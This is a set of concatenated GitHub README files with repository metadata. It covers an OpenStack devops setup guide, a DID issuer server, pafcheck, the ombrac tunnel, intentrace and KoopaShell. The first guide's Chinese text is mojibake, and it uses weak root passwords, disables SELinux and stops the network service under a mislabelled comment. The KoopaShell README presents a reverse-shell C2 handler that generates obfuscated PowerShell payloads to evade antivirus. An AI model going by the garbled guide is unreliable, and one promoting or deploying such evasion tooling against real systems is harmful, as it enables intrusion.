$ sed -i ""s#^CONFIG_NEUTRON_OVS_BRIDGE_IFACES=.*#CONFIG_NEUTRON_OVS_BRIDGE_IFACES=br-ex:ens33#g"" answer.ini
$ sed -i ""s#^CONFIG_PROVISION_DEMO=.*#CONFIG_PROVISION_DEMO=n#g"" answer.ini
```

- ÂÆâË£Ö

```shell
$ packstack --answer-file=answer.ini
```

- È™åËØÅÂÆâË£ÖÊòØÂê¶ÊàêÂäü

ÈÖçÁΩÆDashboard

```
$ vi /etc/httpd/conf.d/15-horizon_vhost.conf
#Âú® WSGIProcessGroup apache ‰∏ãÈù¢ ÊèíÂÖ•‰∏ÄË°å
WSGIApplicationGroup %{GLOBAL}

$ systemctl reload httpd
```


È™åËØÅÁôªÂΩï OpenStack dashboard

http://192.168.105.10/dashboard

Áî®Êà∑ÂêçÔºöadmin

ÂØÜÁ†ÅÔºö123456

### 2.2 ËøêÁª¥Âπ≥Âè∞ËøêË°åÁéØÂ¢É

ËäÇÁÇπIP‰∏∫`192.168.105.20`Ôºå‰ΩøÁî®vmwareÂàõÂª∫‰∏ÄÂè∞`CentOS7.5`ËôöÊãüÊú∫ÔºåÈÖçÁΩÆ‰∏∫2Ê†∏CPU/2G/40GÔºå‰∏ªÊú∫Âêç‰∏∫devops

- ÂÆâË£Ödocker

```shell
# ÈÖçÁΩÆdocker‰ªìÂ∫ì
$ curl -o /etc/yum.repos.d/docker-ce.repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo

# ‰øÆÊîπCentOSÂü∫Á°Ä‰ªìÂ∫ì‰∏∫aliyun
$ curl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-7.repo
$ sed -i -e '/mirrors.cloud.aliyuncs.com/d' -e '/mirrors.aliyuncs.com/d' /etc/yum.repos.d/CentOS-Base.repo
$ yum makecache

# ÂÖ≥Èó≠Èò≤ÁÅ´Â¢ô
$ systemctl stop network
$ systemctl disable network

# Á¶ÅÁî®selinux
$ sed -i 's#^SELINUX=.*#SELINUX=disabled#g' /etc/selinux/config
$ reboot

# ÂÆâË£Ödocker
$ yum -y install docker-ce
$ systemctl start docker
$ systemctl enable docker
```

- ËøêË°åMySQL

```shell
# ËøêË°åÂÆπÂô®
$ docker run --name mysql -p 3306:3306 -d -e MYSQL_ROOT_PASSWORD=123456 -e TZ=Asia/Shanghai -v /opt/data/mysql:/var/lib/mysql mysql:8.0 --lower_case_table_names=1
```

- ËøêË°åRedis

```shell
$ docker run --name redis -p 6379:6379 -d -e TZ=Asia/Shanghai redis
```

- ÂÆâË£ÖJava

```shell
$ yum -y install java-1.8.0-openjdk
```

### 2.3 ÂáÜÂ§áÂºÄÂèëÁéØÂ¢É

Êú¨‰∫∫‰ΩøÁî®MacbookÔºå‰ª•MacbookÊèèËø∞ÂºÄÂèëÁéØÂ¢ÉÂáÜÂ§áÊ≠•È™§

- ÂÆâË£Ö`jdk1.8`
- ÂÆâË£Ö`nvm` Ê≥®Ôºö`nvm`ÊòØ`nodejs`Ê°ÜÊû∂ÁöÑÁÆ°ÁêÜÂô®

```sh
# ÂÆâË£Önvm
$ brew install nvm

# Ê∑ªÂä†ÁéØÂ¢ÉÂèòÈáè
$ vi ~/.zshrc 
export NVM_DIR=""$HOME/.nvm""
# Ë∑ØÂæÑÂèØËÉΩÈúÄË¶ÅÊ†πÊçÆÊÇ®ÂÆûÈôÖÁöÑHomebrewÂÆâË£Ö‰ΩçÁΩÆËøõË°åË∞ÉÊï¥
[ -s ""/opt/homebrew/opt/nvm/nvm.sh"" ] && \. ""/opt/homebrew/opt/nvm/nvm.sh""
[ -s ""/opt/homebrew/opt/nvm/etc/bash_completion.d/nvm"" ] && \. ""/opt/homebrew/opt/nvm/etc/bash_completion.d/nvm""

# ÁîüÊïà
$ source ~/.zshrc

# ÊµãËØï
$ nvm --versio
```

- ‰ΩøÁî®`nvm`ÂÆâË£Önodejs v14.18.2 ÁâàÊú¨

```shell
$ nvm install v14.18.2
```

- ÈÖçÁΩÆÂÖçÂØÜÁôªÂΩïopenstackËäÇÁÇπ

```sh
# ÁîüÂ≠òÂÖ¨Èí•‰∏éÁßÅÈí•ÔºåÂ¶ÇÊûúÊúâÂèØ‰ª•Ë∑≥Ëøá
$ ssh-keygen -t rsa -C ""your_email@example.com"" # ‰πãÂêé‰∏ÄÁõ¥ÂõûËΩ¶

# Â∞ÜÂÖ¨Èí•Â§çÂà∂ÁªôOpenStackËäÇÁÇπ
$ cat ~/.ssh/rsa.pub #Â∞ÜÂÖ∂‰∏≠ÁöÑÂÖ¨Èí•ËøõË°åÂ§çÂà∂
ssh-rsa AAAAB3N*****

# ÁôªÂΩïOpenStackËäÇÁÇπÔºåÂ∞ÜÂ§çÂà∂ÁöÑÂÖ¨Èí•Êã∑Ë¥ùÂà∞OpenStackËäÇÁÇπ
$ ssh root@192.168.105.10
$ echo ""ssh-rsa AAAAB3N*****"" >> ~/.ssh/authorized_keys #Â∞ÜÂ§çÂà∂ÁöÑÂÖ¨Èí•Ê∑ªÂä†ËøõÊù•
$ exit

# ÊµãËØïÂÖçÂØÜÁôªÂΩï
$ ssh root@192.168.105.10
```

<font color='red'>ÈúÄË¶ÅÂÖçÂØÜÁöÑÂéüÂõ†ÔºöÂêéÈù¢‰ºöÂú®SpringBootÊé•Âè£ÂÜÖÈÉ®È©±Âä®ssh ËÆøÈóÆOpenStackÔºåÂπ∂ÊâßË°åOpenStack‰∏≠ÁöÑËøêÁª¥ËÑöÊú¨¬†</font>

- Áî®ideaÂØºÂÖ•`backend/`
- Áî®webstormÂØºÂÖ•`frontend/`
- Â∞Ü `cmd/`ÁõÆÂΩï Êã∑Ë¥ùÂà∞OpenStackËäÇÁÇπÁöÑÊ†πÁõÆÂΩï

```sh
$ scp -r cmd/ root@192.168.105.10:/
# cmdÁõÆÂΩï‰∏≠ÂåÖÂê´ÁöÑÊòØÁºñÂÜôÁöÑËøêÁª¥OpenStackÁöÑËá™ÂÆö‰πâËÑöÊú¨
```

- Áî®navicatÈìæÊé•mysqlÔºåÂú∞ÂùÄ 192.168.105.20:3306ÔºåÂπ∂ÂØºÂÖ•Êèê‰æõÁöÑdevops.sqlÔºåËØ∑‰ΩøÁî®Êó•ÊúüÊúÄÊñ∞ÁöÑËøõË°åÂØºÂÖ•

- Âú®idea‰∏≠ÂêØÂä®ÂêéÁ´ØÈ°πÁõÆ

```yaml
# ‰øÆÊîπapplication.yml
# Ë∑ØÂæÑÔºöneu-admin/src/main/resources/application.yml
carbon:
  profile: /Users/username/Desktop/project/devops/var/uploadPath # ‰øÆÊîπË∑ØÂæÑ‰∏∫Ëá™Â∑±ËÆæÂÆöÁöÑË∑ØÂæÑ
  execHost: 192.168.105.10 # ÂèëËµ∑LinuxÂëΩ‰ª§ÁöÑÁõÆÊ†á‰∏ªÊú∫ÔºåËøôÈáåËÆæÂÆö‰∏∫OpenStack‰∏ªÊú∫Âú∞ÂùÄ
  execPort: 22 # ÂèëËµ∑LinuxÂëΩ‰ª§ÁöÑÁõÆÊ†á‰∏ªÊú∫ÁöÑÁ´ØÂè£ÔºåËøôÈáåËÆæÂÆö‰∏∫OpenStack‰∏ªÊú∫ËøúÁ®ãËÆøÈóÆÁ´ØÂè£
  execUser: root # ÂèëËµ∑LinuxÂëΩ‰ª§ÁöÑÁõÆÊ†á‰∏ªÊú∫ÁöÑÁî®Êà∑ÔºåËøôÈáåËÆæÂÆö‰∏∫OpenStack‰∏ªÊú∫ËøúÁ®ãËÆøÈóÆÁî®Êà∑
server:
  tomcat:
    # Êîπ‰∏∫Ëá™Â∑±ËÆæÂÆöÁöÑË∑ØÂæÑ
    basedir: /Users/chengda/Desktop/project/devops/var/temp
    # ËøûÊé•Ë∂ÖÊó∂Êîπ‰∏∫10ÂàÜÈíü
    connection-timeout: 600000
    # ÂéüÂõ†ÔºöÊâßË°åOpenStackËÑöÊú¨ÂêéÔºåÊï∞ÊçÆÁªìÊûúË¶ÅÂõûÂ°´È°πÁõÆÊï∞ÊçÆÂ∫ìÔºåËøôÈúÄË¶Å‰∏ÄÂÆöÁöÑÂìçÂ∫îÊó∂Èó¥ÔºåÁõÆÂâçÊ≤°ÂÅöÂºÇÊ≠•Â§ÑÁêÜ
spring:
  redis:
    # Âú∞ÂùÄ‰∏éÁ´ØÂè£Ôºå
    host: 192.168.105.20
    port: 6379

# ‰øÆÊîπ application-druid.yml
# Ë∑ØÂæÑÔºöneu-admin/src/main/resources/application-druid.yml
spring:
    datasource:
      druid:
    # ‰∏ªÂ∫ìÊï∞ÊçÆÊ∫ê
        master:
            # Êï∞ÊçÆÂ∫ìÈìæÊé•
          url: jdbc:mysql://192.168.105.20:3306/devops?useUnicode=true&characterEncoding=utf8&zeroDateTimeBehavior=convertToNull&useSSL=true&serverTimezone=GMT%2B8
          username: root
          password: 123456
```

```xml
<!-- ‰øÆÊîπlogback.xml -->
<!-- Ë∑ØÂæÑÔºöneu-admin/src/main/resources/logback.xml -->
<?xml version=""1.0"" encoding=""UTF-8""?>
<configuration>
  <!-- Êó•ÂøóÂ≠òÊîæË∑ØÂæÑÔºåÊîπ‰∏∫Ëá™Â∑±ËÆæÂÆöÁöÑË∑ØÂæÑ -->
	<property name=""log.path"" value=""/Users/username/Desktop/project/devops/var/logs"" />
```

ÂêØÂä®È°πÁõÆ

- Âú®webstorm‰∏≠ÔºåÊâìÂºÄÁªàÁ´ØÔºåÂàáÊç¢Âà∞nodejs v14.18.2ÔºåÂêØÂä®È°πÁõÆ

```sh
# Â∞ÜÂΩìÂâç‰ΩøÁî®ÁöÑnodejs ÂàáÊç¢‰∏∫ v14.18.2
$ nvm use v14.18.2

# ÂÆâË£Ö‰æùËµñ
$ npm i

# ËøêË°å
npm run dev
```

Á≥ªÁªüÊï¥‰ΩìÊû∂ÊûÑÂ¶Ç‰∏ã
<img src='img/framework.png'>

ÊïàÊûúÂ¶Ç‰∏ã

<img src='img/dashboard.png'>

<font color='red'>Ê≥®ÊÑèÔºöÂêéÈù¢ÂêéÂè∞‰ª£Á†ÅÂèòÊõ¥ÂùáÂú®neu-systemÂåÖ‰∏≠ÔºåÂâçÂè∞‰ª£Á†ÅÂèòÊõ¥ÂùáÂú® frontend/src/views/system Ë∑ØÂæÑ‰∏ã¬†</font>

# 3. Ëø≠‰ª£ËÆ∞ÂΩï

- 2024-10-25 ÂÆåÊàêÁßüÊà∑Êñ∞Â¢ûÔºåÁßüÊà∑Âà†Èô§
- 2024-10-27 ÂÆåÊàêÁî®Êà∑Êñ∞Â¢ûÔºåÁî®Êà∑Âà†Èô§
- 2024-11-01 ÂÆåÊàêÁî®Êà∑‰∏éÁßüÊà∑ÁöÑËßíËâ≤ÂÖ≥ËÅî
  - Êï∞ÊçÆÂ∫ìË°®`openstack_project_user`
  - ËÑöÊú¨`openstack-project-user-associate.sh`
- 2024-11-05 ÂÆåÊàêÁî®Êà∑‰∏éÁßüÊà∑ÁöÑËßíËâ≤ÂÖ≥ËÅî
  - ÂâçÁ´Ø 
  - ÂêéÁ´Ø
  - ÂàõÂª∫Êï∞ÊçÆÂ∫ìËÑöÊú¨ devops-2024-11-05.sql
- 2024-11-07 Êñ∞Â¢ûÁßüÊà∑Áî®Êà∑ÁöÑÂÖ≥ËÅîËß£Èô§-ÂÆåÊØï
  - ËÑöÊú¨ `openstack-project-user-disassociate.sh`
  - ÂêéÁ´ØÊé•Âè£ `OpenstackProjectUserController.sh` Â¢ûÂä†Ëß£Èô§ÂÖ≥ËÅîÈÄªËæë

- 2024-11-12 Êñ∞Â¢ûÈïúÂÉèÁÆ°ÁêÜ-Êñ∞Â¢ûÈïúÂÉè-ËÑöÊú¨-Êï∞ÊçÆÂ∫ì-‰Ωé‰ª£Á†Å-Êé•Âè£
  - ËÑöÊú¨ `openstack-image-create.sh`
  - ÂêéÁ´ØÊé•Âè£ `OpenstackImageInfoController.java`
  - ÂâçÁ´ØÈ°µÈù¢-‰Ωé‰ª£Á†ÅÂàùÂßãÂåñÈ°µÈù¢
    - `openstack_image_info.js`
    - `openstack_image_info/index.vue`
  - Êï∞ÊçÆÂ∫ìÊõ¥Êñ∞ `devops-2024-11-12.sql`
",0,0,1,,,0.0
OmniOneID/did-issuer-server,develop,"Issuer Server
==

Welcome to the Issuer Server Repository. <br>
This repository contains the source code, documentation, and related resources for the Issuer Server.

## Folder Structure
Overview of the major folders and documents in the project directory:

```
did-issuer-server
‚îú‚îÄ‚îÄ CHANGELOG.md
‚îú‚îÄ‚îÄ CLA.md
‚îú‚îÄ‚îÄ CODE_OF_CONDUCT.md
‚îú‚îÄ‚îÄ CONTRIBUTING.md
‚îú‚îÄ‚îÄ LICENSE
‚îú‚îÄ‚îÄ dependencies-license.md
‚îú‚îÄ‚îÄ MAINTAINERS.md
‚îú‚îÄ‚îÄ README.md
‚îú‚îÄ‚îÄ RELEASE-PROCESS.md
‚îú‚îÄ‚îÄ SECURITY.md
‚îú‚îÄ‚îÄ docs
‚îÇ¬†¬† ‚îî‚îÄ‚îÄ api
‚îÇ¬†¬†     ‚îî‚îÄ‚îÄ Issuer_API_ko.md
‚îÇ¬†¬† ‚îî‚îÄ‚îÄ db
‚îÇ¬†¬†     ‚îî‚îÄ‚îÄ OpenDID_TableDefinition_Issuer.md
‚îÇ¬†¬† ‚îî‚îÄ‚îÄ errorCode
‚îÇ¬†¬†     ‚îî‚îÄ‚îÄ Issuer_ErrorCode.md
‚îÇ¬†¬† ‚îî‚îÄ‚îÄ installation
‚îÇ¬†¬†     ‚îî‚îÄ‚îÄ OpenDID_IssuerServer_InstallationAndOperation_Guide.md
‚îî‚îÄ‚îÄ source
    ‚îî‚îÄ‚îÄ did-issuer-server
        ‚îú‚îÄ‚îÄ gradle
        ‚îú‚îÄ‚îÄ libs
            ‚îî‚îÄ‚îÄ did-sdk-common-1.0.0.jar
            ‚îî‚îÄ‚îÄ did-blockchain-sdk-server-1.0.0.jar
            ‚îî‚îÄ‚îÄ did-core-sdk-server-1.0.0.jar
            ‚îî‚îÄ‚îÄ did-crypto-sdk-server-1.0.0.jar
            ‚îî‚îÄ‚îÄ did-datamodel-sdk-server-1.0.0.jar
            ‚îî‚îÄ‚îÄ did-wallet-sdk-server-1.0.0.jar
        ‚îú‚îÄ‚îÄ sample
        ‚îî‚îÄ‚îÄ src
        ‚îî‚îÄ‚îÄ build.gradle
        ‚îî‚îÄ‚îÄ README.md
        ‚îî‚îÄ‚îÄ README_ko.md
```

<br/>

Below is a description of each folder and file in the directory:

| Name                             | Description                                     |
| -------------------------------- | ----------------------------------------------- |
| CHANGELOG.md                     | Version-specific changes in the project         |
| CODE_OF_CONDUCT.md               | Code of conduct for contributors                |
| CONTRIBUTING.md                  | Contribution guidelines and procedures          |
| LICENSE                          | License                                         |
| dependencies-license.md          | Licenses for the project‚Äôs dependency libraries |
| MAINTAINERS.md                   | Guidelines for project maintainers              |
| RELEASE-PROCESS.md               | Procedures for releasing new versions           |
| SECURITY.md                      | Security policies and vulnerability reporting   |
| docs                             | Documentation                                   |
| ‚îñ api                            | API guide documentation                         |
| ‚îñ db                             | Database Table Specifications                   |
| ‚îñ errorCode                      | Error codes and troubleshooting guides          |
| ‚îñ installation                   | Installation and setup instructions             |
| source                           | Server source code project                      |
| ‚îñ did-issuer-server              | Issuer Server source code and build files       |
| &nbsp;&nbsp;&nbsp;‚îñ gradle       | Gradle build configurations and scripts         |
| &nbsp;&nbsp;&nbsp;‚îñ libs         | External libraries and dependencies             |
| &nbsp;&nbsp;&nbsp;‚îñ sample       | Sample files                                    |
| &nbsp;&nbsp;&nbsp;‚îñ src          | Main source code directory                      |
| &nbsp;&nbsp;&nbsp;‚îñ build.gradle | Gradle build configuration file                 |
| &nbsp;&nbsp;&nbsp;‚îñ README.md    | Overview and instructions for the source code   |

<br/>


## Libraries

Libraries used in this project are organized into two main categories:

1. **Open DID Libraries**: These libraries are developed by the Open DID project and are available in the [libs folder](source/did-issuer-server/libs). They include:

   - `did-sdk-common-1.0.0.jar`
   - `did-blockchain-sdk-server-1.0.0.jar`
   - `did-core-sdk-server-1.0.0.jar`
   - `did-crypto-sdk-server-1.0.0.jar`
   - `did-datamodel-sdk-server-1.0.0.jar`
   - `did-wallet-sdk-server-1.0.0.jar`

2. **Third-Party Libraries**: These libraries are open-source dependencies managed via the [build.gradle](source/did-issuer-server/build.gradle) file. For a detailed list of third-party libraries and their licenses, please refer to the [dependencies-license.md](dependencies-license.md) file.

## Installation And Operation Guide

For detailed instructions on installing and configuring the Issuer Server, please refer to the guide below:
- [OpenDID Issuer Server Installation and Operation Guide](docs/installation/OpenDID_IssuerServer_InstallationAndOperation_Guide.md)  

## API Reference

API documentation is available in two main types:

- **Issuer API**: Detailed reference for the Issuer Server's API endpoints and usage.
  - [Issuer API Reference](docs/api/Issuer_API_ko.md)

## Change Log

The Change Log provides a detailed record of version-specific changes and updates. You can find it here:
- [Change Log](./CHANGELOG.md)
 
## OpenDID Demonstration Videos <br>
To watch our demonstration videos of the OpenDID system in action, please visit our [Demo Repository](https://github.com/OmniOneID/did-demo-server). <br>

These videos showcase key features including user registration, VC issuance, and VP submission processes.

## Contributing

Please read [CONTRIBUTING.md](CONTRIBUTING.md) and [CODE_OF_CONDUCT.md](CODE_OF_CONDUCT.md) for details on our code of conduct, and the process for submitting pull requests to us.

## License
[Apache 2.0](LICENSE)
",1,0,3,Apache-2.0,"auto_assign.yml,build.yml,ci.yml",18.0
ekg/pafcheck,main,"# pafcheck

pafcheck is a tool for validating PAF (Pairwise Alignment Format) files against their corresponding FASTA sequences. It ensures that the alignments described in the PAF file match the actual sequences in the FASTA files.

## Installation

To install pafcheck from GitHub, follow these steps:

```bash
git clone https://github.com/ekg/pafcheck.git
cd pafcheck
cargo build --release
```

The compiled binary will be available at `target/release/pafcheck`.

## Usage

```bash
pafcheck -q <query_fasta> -t <target_fasta> -p <paf_file> [-e <error_mode>]
```

- `-q, --query-fasta`: Path to the bgzip-compressed and tabix-indexed query FASTA file
- `-t, --target-fasta`: Path to the bgzip-compressed and tabix-indexed target FASTA file (optional, defaults to query FASTA if not provided)
- `-p, --paf`: Path to the PAF file to validate
- `-e, --error-mode`: Error handling mode: ""omit"" (default) or ""report""

## Error Types Checked

pafcheck validates the following types of errors:

1. **Mismatch**: When the CIGAR string indicates a match, but the actual sequences don't match.
2. **CigarMismatch**: When the CIGAR string indicates a mismatch, but the actual sequences match.
3. **LengthMismatch**: When the length implied by the CIGAR string doesn't match the actual sequence length.

## Generating Input Files

To generate input files that can be validated with pafcheck, you can use tools like wfmash and minimap2. Here are example commands:

### Using wfmash:

```bash
wfmash tests/data/a.fa tests/data/b.fa > w.paf
```

### Using minimap2:

```bash
minimap2 -cx asm20 --eqx tests/data/a.fa tests/data/b.fa > m.paf
```

Note: The `--eqx` option is important for minimap2 as it generates CIGAR strings with '=' for matches and 'X' for mismatches, which is required for proper validation with pafcheck.

After generating these PAF files, you can validate them using pafcheck:

```bash
pafcheck -q tests/data/a.fa -t tests/data/b.fa -p w.paf
pafcheck -q tests/data/a.fa -t tests/data/b.fa -p m.paf
```

Make sure to bgzip-compress and index your FASTA files before running pafcheck:

```bash
bgzip tests/data/a.fa
bgzip tests/data/b.fa
samtools faidx tests/data/a.fa.gz
samtools faidx tests/data/b.fa.gz
```

## Contributing

Contributions to pafcheck are welcome! Please feel free to submit a Pull Request.

## License

This project is licensed under the MIT license. Have fun.
",0,0,1,MIT,rust.yml,0.0
ombrac/ombrac,main,"# Ombrac

**Ombrac** is a high-performance, Rust-based TCP tunneling solution designed for secure communication between clients and servers. It is ideal for developers and network administrators seeking efficient and secure data transmission.

## Features
- Optionally pass through SOCKS
- Encryption is ensured by the built-in TLS layer of QUIC
- Employs QUIC multiplexing with bidirectional streams for efficient transmission

[![Apache 2.0 Licensed][license-badge]][license-url]
[![Build Status][actions-badge]][actions-url]
[![Telegram Group][telegram-group-badge]][telegram-group-url]


## Install
### Binaries
Download the latest release from the [releases page](https://github.com/ombrac/ombrac/releases).

## Example
### Server
```shell
ombrac-server -l [::]:443 --tls-cert ./cert.pem --tls-key ./key.pem
```
This command starts the Ombrac server listening on port 443, using the provided TLS certificate and key for encrypted communication.

### Client
```shell
ombrac-client --socks 127.0.0.1:1080 --server-address example.com:443
```
This command sets up a SOCKS5 server on 127.0.0.1:1080, forwarding traffic to example.com:443.

## Usage
### Server

```shell
Usage: ombrac-server [OPTIONS] --listen <ADDR> --tls-cert <FILE> --tls-key <FILE>

Options:
  -h, --help     Print help
  -V, --version  Print version

Transport QUIC:
  -l, --listen <ADDR>
          Transport server listening address
      --tls-cert <FILE>
          Path to the TLS certificate file for secure connections
      --tls-key <FILE>
          Path to the TLS private key file for secure connections
      --initial-congestion-window <NUM>
          Initial congestion window in bytes [default: 32]
      --max-handshake-duration <TIME>
          Handshake timeout in millisecond [default: 3000]
      --max-idle-timeout <TIME>
          Connection idle timeout in millisecond [default: 0]
      --max-keep-alive-period <TIME>
          Connection keep alive period in millisecond [default: 8000]
      --max-open-bidirectional-streams <NUM>
          Connection max open bidirectional streams [default: 100]
      --bidirectional-local-data-window <NUM>
          Bidirectional stream local data window [default: 3750000]
      --bidirectional-remote-data-window <NUM>
          Bidirectional stream remote data window [default: 3750000]

DNS:
      --dns <ENUM>  Domain name system resolver [default: cloudflare] [possible values: cloudflare, cloudflare-tls, google, google-tls]

Logging:
      --tracing-level <TRACE>  Logging level e.g., INFO, WARN, ERROR [default: WARN]
```

### Client
```shell
Usage: ombrac-client [OPTIONS] --server-address <ADDR>

Options:
  -h, --help     Print help
  -V, --version  Print version

Endpoint SOCKS:
      --socks <ADDR>  Listening address for the SOCKS server [default: 127.0.0.1:1080]

Transport QUIC:
      --bind <ADDR>
          Bind local address
      --server-name <STR>
          Name of the server to connect to
      --server-address <ADDR>
          Address of the server to connect to
      --tls-cert <FILE>
          Path to the TLS certificate file for secure connections
      --initial-congestion-window <NUM>
          Initial congestion window in bytes [default: 32]
      --max-multiplex <NUM>
          Connection multiplexing [default: 0]
      --max-multiplex-interval <TIME>
          Connection multiplexing interval in millisecond [default: 60000]
      --max-multiplex-per-interval <NUM>
          Connection multiplexing allowed within a specific interval [default: 16]
      --max-handshake-duration <TIME>
          Handshake timeout in millisecond [default: 3000]
      --max-idle-timeout <TIME>
          Connection idle timeout in millisecond [default: 0]
      --max-keep-alive-period <TIME>
          Connection keep alive period in millisecond [default: 8000]
      --max-open-bidirectional-streams <NUM>
          Connection max open bidirectional streams [default: 100]
      --bidirectional-local-data-window <NUM>
          Bidirectional stream local data window [default: 3750000]
      --bidirectional-remote-data-window <NUM>
          Bidirectional stream remote data window [default: 3750000]

Logging:
      --tracing-level <TRACE>  Logging level e.g., INFO, WARN, ERROR [default: WARN]
```

## Contributing
Contributions are welcome! Feel free to fork the repository, submit issues, or send pull requests to help improve Ombrac.

## License
This project is licensed under the [Apache-2.0 License](./LICENSE).

[license-badge]: https://img.shields.io/badge/license-apache-blue.svg
[license-url]: https://github.com/ombrac/ombrac/blob/main/LICENSE
[actions-badge]: https://github.com/ombrac/ombrac/workflows/CI/badge.svg
[actions-url]: https://github.com/ombrac/ombrac/actions/workflows/ci.yml?query=branch%3Amain
[telegram-group-badge]: https://img.shields.io/badge/Telegram-2CA5E0?style=flat-squeare&logo=telegram&logoColor=white
[telegram-group-url]: https://t.me/ombrac_group",6,2,2,Apache-2.0,"ci.yml,release.yml",37.0
sectordistrict/intentrace,main,"<p align=""center"">
  <img src=""./itrace.png"" alt=""Intentrace"">
</p>

# About

intentrace is a strace for everyone, intentrace works similarly to strace in that it intercepts and records the system calls which are called by a process, it then reasons through these syscalls by consulting an enormous backlog of handwritten syscall deductions.
Due to the fact that linux syscalls almost always have dual usage that's obfuscated by libraries, seeing what a syscall is exactly asking for is immensely useful when e.g. a programmer is debugging a crashing binary.
<p align=""center"">
  <img src=""./intentrace-example.png"" alt=""Intentrace Example"">
</p>


Intentrace follows a similar working methodology to the one employed by the [UniKraft kernel](https://github.com/unikraft) in that it attempts to cover a high percentage of the most popular linux software despite supporting only around 166 syscalls out of the 380+ linux syscalls (see page 8 of the Unikraft Paper for an example of strategic syscall coverage: https://arxiv.org/pdf/2104.12721). It's planned eventually for intentrace to cover all linux syscalls.


## Usage

#### to quickly see how intentrace works in action, you can run simple examples

`intentrace ls`

`intentrace google-chrome`

#### to disable program output from cluttering the syscall feed add `-q`

`intentrace -q ls`

#### to include the child processes of multi-threaded programs add `-f` 

`intentrace -f docker run alpine`


| Parameter      | Description                       | Default value |
|----------------|-----------------------------------|---------------|
| -c<br/>--summary | provide a summary table at the end of tracing | `false`       |
| -p `pid`<br/>--attach `pid` | attach to an already running proceess | `not enabled`       |
| -f<br/>--follow-forks   | trace child process when traced programs create them | `false`       |
| -z<br/>--failed-only   | only print failed syscalls | `false`       |
| -q<br/>--mute-stdout   | mute traced program's std output | `false`       |





## Installation

### Build from source

Prerequisites:

* Latest stable version of [Rust](https://www.rust-lang.org/tools/install) and Cargo.


Build and run intentrace:

```
git clone https://github.com/sectordistrict/intentrace.git
cd intentrace
cargo build --release
```


### Install from crates.io:

```
cargo install intentrace
```


### Package Manager Availability 

[![Packaging status](https://repology.org/badge/vertical-allrepos/intentrace.svg)](https://repology.org/project/intentrace/versions)





## Project status

intentrace is currently in beta, currently multi-threaded programs are a hit and miss.

intentrace was originally intended to be a 2 window TUI, where a top panel shows a normal stream of syscalls, and a bottom panel containing metadata and explanation, however this was abandoned in favor of the current scheme.

#### Supported architecture

intentrace currently only supports `x86-64`, given that the program is currently in beta, PRs for cross compatibility will unfortunately not be accepted until the program is stable enough.


## Contributing

Support intentrace by contributing issues and PRs, don't feel discouraged from filing issues or creating PRs. Reading the source is a great way to learn how linux works.

Feel free to file issues and open Pull Requests.
Issues and PRs can contain and involve:
- better wording.
- suggestions for granularity.
- suggestions for fixes.
- etc.. there are no rules, feel free to contribute as you see fit.

",6,2,1,MIT,,3.0
Jsmoreira02/KoopaShell,main,"![Untitled_design_1_-removebg-preview](https://github.com/user-attachments/assets/92ab35e6-ef63-4a9d-b0a5-93f4fcdbb60f)

#

<div>
    <img src=""https://img.shields.io/badge/Language%20-Rust-darkorange.svg"" style=""max-width: 100%;"">
    <img src=""https://img.shields.io/badge/Target OS%20-Linux, Windows-darkblue.svg"" style=""max-width: 100%;"">
    <img src=""https://img.shields.io/badge/Cargo builds%20-clippers, rustyline, clap-beige.svg"" style=""max-width: 100%;"">
    <img src=""https://img.shields.io/badge/License%20-CC BY_ND 4.0-lightgreen.svg"" style=""max-width: 100%;"">
    <img src=""https://img.shields.io/badge/Type%20-C2 Like | Multi Handler-purple.svg"" style=""max-width: 100%;"">
    
</div></br>


| :exclamation:  **Under active development**  :exclamation: |

> C2, also known as Command and Control, refers to the infrastructure and techniques used by hackers to maintain control over compromised systems or networks. By establishing a connection with these compromised systems, hackers can execute their malicious activities

## About:

Koopa Shell is an advanced tool developed in Rust, designed as a Multiple Reverse TCP Shell Handler and Stage 0/1 C2 Framework, it elevates shell interactions by generating obfuscated PowerShell payload, ensuring both stealth and efficiency. Koopa Shell supports seamless connections across Linux and Windows environments, making it a versatile for working in diverse infrastructures.

- Support for multiple reverse TCP connections.
- Make quick and easy transitions between all your reverse shell connections
- Compatible with Linux and Windows systems.
- Improved functionality for controlling and using shell sessions.
- Generation of obfuscated powershell payloads to avoid detection.

Made for pentest operations or attack simulations focused on evading initial detection and managing sessions in different environments.


| **New features and implementations will be continually added to the project** |

## New Features:

- üìå**NEW**: Added an easier way to connect to and navigate through sessions (Sessions index)
- üìå**NEW**: The format of the session IDs has been changed to hexadecimal (16 bit) code.
- üïí **Coming soon**: New payload types for linux and windows

## Usage:

### Bypass Windows AV:

https://github.com/user-attachments/assets/2ec6d9dc-d92e-4c1f-bfe7-a44ac5cb11aa


### Multi sessions
https://github.com/user-attachments/assets/930dcd80-e409-4a02-aedb-8dbe44472945

##

## Installation:

```
  git clone https://github.com/Jsmoreira02/KoopaShell.git
  cd KoopaShell
  chmod +x install_dependencies.sh
  bash install_dependecies.sh
```

or

```bash
  curl -o install_dependecies.sh https://raw.githubusercontent.com/Jsmoreira02/KoopaShell/main/install_dependecies.sh && bash install_dependecies.sh
```

## Dependecies:

### Debian/Ubuntu:
> sudo apt-get install -y cmake g++ gcc zlib1g-dev libx11-dev libxext-dev libxrender-dev libxrandr-dev libxinerama-dev libxcursor-dev libxfixes-dev libx11-xcb-dev libxss-dev libxdmcp-dev libpng-dev pkg-config

### Fedora/RHEL-based:
> sudo dnf install -y cmake gcc-c++ gcc zlib-devel libX11-devel libXext-devel libXrender-devel libXrandr-devel libXinerama-devel libXcursor-devel libXfixes-devel libXdmcp-devel libXss-devel libpng-devel pkg-config

### Arch Linux-based: 
> sudo pacman -Sy --needed cmake gcc gcc-libs zlib libx11 libxext libxrender libxrandr libxinerama libxcursor libxfixes libxdmcp libxss libpng pkgconf

## Tribute:

I'd like to take a moment to express my absolute admiration for these offensive security programmers/researchers. They inspired me to decide to create this tool, and I really hope I can achieve this level of capability.

- [@t3l3machus](https://github.com/t3l3machus)
- [@Z4nzu](https://github.com/Z4nzu)
- [@loseys](https://github.com/loseys)
- [@Teach2Breach](https://github.com/Teach2Breach)


### Contributions:
- üí™ If you have an idea for improvement and want to contribute to the performance of the code, you are more than welcome to submit a pull request.

# Warning:    
> I am not responsible for any illegal use or damage caused by this tool. It was written for fun, not evil and is intended to raise awareness about cybersecurity.

***Have a good hack :D***


",0,0,1,NOASSERTION,,0.0
